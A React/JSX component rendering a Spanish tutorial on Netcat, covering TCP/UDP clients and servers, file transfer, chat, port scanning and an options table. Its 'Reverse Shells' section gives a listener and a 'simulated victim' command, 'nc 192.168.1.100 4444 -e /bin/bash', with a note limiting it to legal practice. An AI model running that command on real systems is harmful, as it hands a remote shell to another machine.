import Titulo from "./../../componentes/titulo.jsx";
import Lista from "./../../componentes/lista.jsx";
import Texto from "./../../componentes/texto.jsx";
import Linea from "./../../componentes/linea.jsx";

function nameabcd({ }) {
  return (
    <>
      <Titulo title="h1" id="netcat-en-linux">Netcat en Linux</Titulo>
      <Linea />
      <Titulo title="h2" id="temario">Temario</Titulo>
      <Lista>
        <li><a href="#netcat-en-linux">Netcat en Linux</a>
          <Lista>
            <li><a href="#temario">Temario</a></li>
            <li><a href="#qué-es-netcat">¿Qué es Netcat?</a></li>
            <li><a href="#instalación">Instalación</a></li>
            <li><a href="#sintaxis-general">Sintaxis general</a></li>
            <li><a href="#modos-principales-de-uso">Modos principales de uso</a>
              <Lista>
                <li><a href="#cliente-tcp">Cliente TCP</a></li>
                <li><a href="#servidor-tcp">Servidor TCP</a></li>
              </Lista>
            </li>
            <li><a href="#udp-en-lugar-de-tcp">UDP en lugar de TCP</a></li>
            <li><a href="#transferencia-de-archivos">Transferencia de archivos</a>
              <Lista>
                <li><a href="#enviar-un-archivo">Enviar un archivo</a></li>
              </Lista>
            </li>
            <li><a href="#chat-simple-entre-dos-pcs-tcp">Chat simple entre dos PCs
              (TCP)</a></li>
            <li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li>
            <li><a href="#redirección-de-entradasalida">Redirección de
              entrada/salida</a></li>
            <li><a href="#reverse-shells-usos-éticos-y-educativos">Reverse Shells
              (usos éticos y educativos)</a>
              <Lista>
                <li><a href="#en-el-servidor-escuchando">En el servidor
                  (escuchando)</a></li>
                <li><a href="#en-la-víctima-simulada">En la víctima (simulada)</a></li>
              </Lista>
            </li>
            <li><a href="#otras-opciones-útiles">Otras opciones útiles</a></li>
            <li><a href="#ejemplo-práctico-completo">Ejemplo práctico completo</a>
              <Lista>
                <li><a href="#crear-servidor-de-eco">Crear servidor de eco</a></li>
                <li><a href="#cliente">Cliente</a></li>
              </Lista>
            </li>
            <li><a href="#resumen-rápido">Resumen rápido</a></li>
            <li><a href="#alternativas-modernas">Alternativas modernas</a></li>
          </Lista>
        </li>
      </Lista>
      <Texto><a href="./../../readme.md#5-python">Regresar a la Guía
        Principal</a></Texto>
      <Linea />
      <Titulo title="h2" id="qué-es-netcat">¿Qué es Netcat?</Titulo>
      <Texto><strong>Netcat</strong> (abreviado <code>nc</code>) es una
        herramienta de línea de comandos usada para:</Texto>
      <Lista>
        <li>Leer y escribir datos en conexiones <strong>TCP o UDP</strong>.</li>
        <li>Crear <strong>clientes y servidores</strong>.</li>
        <li>Transferir archivos, hacer <strong>escucha de puertos</strong>,
          <strong>chats</strong>, o incluso <strong>backdoors</strong> (de forma
          ética y controlada).
        </li>
      </Lista>
      <Texto>Es conocida como el <strong>“cuchillo suizo de las redes”</strong>
        🧰.</Texto>
      <Linea />
      <Titulo title="h2" id="instalación">Instalación</Titulo>
      <Texto>En la mayoría de sistemas viene preinstalado:</Texto>
      <div class="sourceCode" id="cb1">
        <pre
          class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-h</span></span></code></pre>
      </div>
      <Texto>Si no lo tienes:</Texto>
      <Texto><strong>Linux (Debian/Ubuntu):</strong></Texto>
      <div class="sourceCode" id="cb2">
        <pre
          class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt install netcat</span></code></pre>
      </div>
      <Texto><strong>Windows:</strong> Puedes usar <strong>Ncat</strong> (parte de
        Nmap): 👉 <a href="https://nmap.org/ncat/">https://nmap.org/ncat/</a></Texto>
      <Linea />
      <Titulo title="h2" id="sintaxis-general">Sintaxis general</Titulo>
      <div class="sourceCode" id="cb3">
        <pre
          class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="pp">[</span><span class="ss">opciones</span><span class="pp">]</span> <span class="pp">[</span><span class="ss">host</span><span class="pp">]</span> <span class="pp">[</span><span class="ss">puerto</span><span class="pp">]</span></span></code></pre>
      </div>
      <Linea />
      <Titulo title="h2" id="modos-principales-de-uso">Modos principales de uso</Titulo>
      <Titulo title="h3" id="cliente-tcp">Cliente TCP</Titulo>
      <Texto>Conectarse a un servidor:</Texto>
      <div class="sourceCode" id="cb4">
        <pre
          class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> 127.0.0.1 8080</span></code></pre>
      </div>
      <Texto>Esto abre una conexión al puerto 8080 del localhost.</Texto>
      <Titulo title="h3" id="servidor-tcp">Servidor TCP</Titulo>
      <Texto>Escuchar conexiones:</Texto>
      <div class="sourceCode" id="cb5">
        <pre
          class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-l</span> <span class="at">-p</span> 8080</span></code></pre>
      </div>
      <Texto>🔹 <code>-l</code> → modo escucha</Texto>
      <Texto>🔹 <code>-p</code> → especifica el puerto</Texto>
      <Texto>Luego, desde otro terminal:</Texto>
      <div class="sourceCode" id="cb6">
        <pre
          class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> 127.0.0.1 8080</span></code></pre>
      </div>
      <Texto>Ahora puedes <strong>enviar mensajes entre ambos terminales (chat
        simple)</strong>.</Texto>
      <Linea />
      <Titulo title="h2" id="udp-en-lugar-de-tcp">UDP en lugar de TCP</Titulo>
      <Texto>Para usar <strong>UDP</strong> en vez de TCP:</Texto>
      <div class="sourceCode" id="cb7">
        <pre
          class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Servidor</span></span>
            <span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-u</span> <span class="at">-l</span> <span class="at">-p</span> 6000</span>
            <span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a></span>
            <span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Cliente</span></span>
            <span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-u</span> 127.0.0.1 6000</span></code></pre>
      </div>
      <Texto>🔹 <code>-u</code> → activa modo UDP.</Texto>
      <Linea />
      <Titulo title="h2" id="transferencia-de-archivos">Transferencia de archivos</Titulo>
      <Titulo title="h3" id="enviar-un-archivo">Enviar un archivo</Titulo>
      <Texto>Servidor que recibirá:</Texto>
      <div class="sourceCode" id="cb8">
        <pre
          class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-l</span> <span class="at">-p</span> 5000 <span class="op">&gt;</span> archivo_recibido.txt</span></code></pre>
      </div>
      <Texto>Cliente que envía:</Texto>
      <div class="sourceCode" id="cb9">
        <pre
          class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> 127.0.0.1 5000 <span class="op">&lt;</span> archivo.txt</span></code></pre>
      </div>
      <Texto>👉 El archivo <code>archivo.txt</code> se envía al servidor.</Texto>
      <Linea />
      <Titulo title="h2" id="chat-simple-entre-dos-pcs-tcp">Chat simple entre dos PCs
        (TCP)</Titulo>
      <Texto>En una máquina:</Texto>
      <div class="sourceCode" id="cb10">
        <pre
          class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-l</span> <span class="at">-p</span> 4000</span></code></pre>
      </div>
      <Texto>En otra:</Texto>
      <div class="sourceCode" id="cb11">
        <pre
          class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> IP_DEL_SERVIDOR 4000</span></code></pre>
      </div>
      <Texto>Ahora ambos pueden escribir y leer mensajes.</Texto>
      <Linea />
      <Titulo title="h2" id="escaneo-de-puertos">Escaneo de puertos</Titulo>
      <Texto>Netcat puede escanear qué puertos están abiertos en una máquina:</Texto>
      <div class="sourceCode" id="cb12">
        <pre
          class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-zv</span> 192.168.1.10 20-80</span></code></pre>
      </div>
      <Texto>🔹 <code>-z</code> → modo “scan” sin enviar datos.</Texto>
      <Texto>🔹 <code>-v</code> → modo verbose (muestra resultado).</Texto>
      <Texto>🔹 <code>20-80</code> → rango de puertos.</Texto>
      <Linea />
      <Titulo title="h2" id="redirección-de-entradasalida">Redirección de entrada/salida</Titulo>
      <Texto>Puedes usar <strong>pipes</strong> para automatizar tareas:</Texto>
      <div class="sourceCode" id="cb13">
        <pre
          class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;Hola servidor&quot;</span> <span class="kw">|</span> <span class="ex">nc</span> 127.0.0.1 8080</span></code></pre>
      </div>
      <Texto>O guardar la respuesta:</Texto>
      <div class="sourceCode" id="cb14">
        <pre
          class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> 127.0.0.1 80 <span class="op">&lt;</span> peticion.txt <span class="op">&gt;</span> respuesta.txt</span></code></pre>
      </div>
      <Linea />
      <Titulo title="h2" id="reverse-shells-usos-éticos-y-educativos">Reverse Shells (usos
        éticos y educativos)</Titulo>
      <Texto>Netcat puede crear conexiones remotas tipo <strong>shell
        inversa</strong>, usadas en <strong>pentesting</strong> (no
        ilegalmente).</Texto>
      <Titulo title="h3" id="en-el-servidor-escuchando">En el servidor (escuchando)</Titulo>
      <div class="sourceCode" id="cb15">
        <pre
          class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-l</span> <span class="at">-p</span> 4444 <span class="at">-v</span></span></code></pre>
      </div>
      <Titulo title="h3" id="en-la-víctima-simulada">En la víctima (simulada)</Titulo>
      <div class="sourceCode" id="cb16">
        <pre
          class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> 192.168.1.100 4444 <span class="at">-e</span> /bin/bash</span></code></pre>
      </div>
      <Texto>👉 Esto le da al servidor una consola remota de la otra máquina.
        <em>(Solo en entornos controlados o de práctica legal.)</em>
      </Texto>
      <Linea />
      <Titulo title="h2" id="otras-opciones-útiles">Otras opciones útiles</Titulo>
      <table>
        <thead>
          <tr>
            <th>Opción</th>
            <th>Descripción</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>-l</code></td>
            <td>Escucha conexiones entrantes</td>
          </tr>
          <tr>
            <td><code>-p &lt;puerto&gt;</code></td>
            <td>Define puerto local</td>
          </tr>
          <tr>
            <td><code>-v</code></td>
            <td>Verbose (muestra información detallada)</td>
          </tr>
          <tr>
            <td><code>-z</code></td>
            <td>Modo escaneo sin datos</td>
          </tr>
          <tr>
            <td><code>-n</code></td>
            <td>No resuelve DNS (usa IP directamente)</td>
          </tr>
          <tr>
            <td><code>-u</code></td>
            <td>Usa UDP</td>
          </tr>
          <tr>
            <td><code>-e &lt;comando&gt;</code></td>
            <td>Ejecuta un programa tras conectar (⚠️ uso ético)</td>
          </tr>
        </tbody>
      </table>
      <Linea />
      <Titulo title="h2" id="ejemplo-práctico-completo">Ejemplo práctico completo</Titulo>
      <Titulo title="h3" id="crear-servidor-de-eco">Crear servidor de eco</Titulo>
      <div class="sourceCode" id="cb17">
        <pre
          class="sourceCode bash"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Servidor</span></span>
            <span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-l</span> <span class="at">-p</span> 1234 <span class="at">-v</span></span></code></pre>
      </div>
      <Titulo title="h3" id="cliente">Cliente</Titulo>
      <div class="sourceCode" id="cb18">
        <pre
          class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> 127.0.0.1 1234</span></code></pre>
      </div>
      <Texto>Ahora cualquier texto que envíes se reflejará entre ambos.</Texto>
      <Linea />
      <Titulo title="h2" id="resumen-rápido">Resumen rápido</Titulo>
      <table>
        <colgroup>
          <col style="width: 19%" />
          <col style="width: 54%" />
          <col style="width: 26%" />
        </colgroup>
        <thead>
          <tr>
            <th>Función</th>
            <th>Comando</th>
            <th>Descripción</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>Cliente TCP</td>
            <td><code>nc host puerto</code></td>
            <td>Conecta a un servidor</td>
          </tr>
          <tr>
            <td>Servidor TCP</td>
            <td><code>nc -l -p puerto</code></td>
            <td>Escucha conexiones</td>
          </tr>
          <tr>
            <td>Cliente UDP</td>
            <td><code>nc -u host puerto</code></td>
            <td>Envía datos por UDP</td>
          </tr>
          <tr>
            <td>Servidor UDP</td>
            <td><code>nc -u -l -p puerto</code></td>
            <td>Escucha por UDP</td>
          </tr>
          <tr>
            <td>Transferir archivo</td>
            <td><code>nc -l -p 1234 &gt; out.txt</code> /
              <code>nc host 1234 &lt; in.txt</code>
            </td>
            <td>Enviar archivos</td>
          </tr>
          <tr>
            <td>Escanear puertos</td>
            <td><code>nc -zv host 1-1024</code></td>
            <td>Detectar puertos abiertos</td>
          </tr>
        </tbody>
      </table>
      <Linea />
      <Titulo title="h2" id="alternativas-modernas">Alternativas modernas</Titulo>
      <Lista>
        <li><strong>Ncat</strong> (de Nmap): versión más segura y moderna.</li>
        <li><strong>Socat</strong>: similar pero con más opciones.</li>
        <li><strong>PowerCat</strong> (en Windows PowerShell): equivalente en
          sistemas modernos.</li>
      </Lista>
      <Linea />
      <Texto><a href="./../../readme.md#5-python">Regresar a la Guía
        Principal</a></Texto>
      <blockquote>
        <Texto><strong>Autor:</strong> Fravelz</Texto>
      </blockquote>
    </>
  );
}
export default nameabcd;
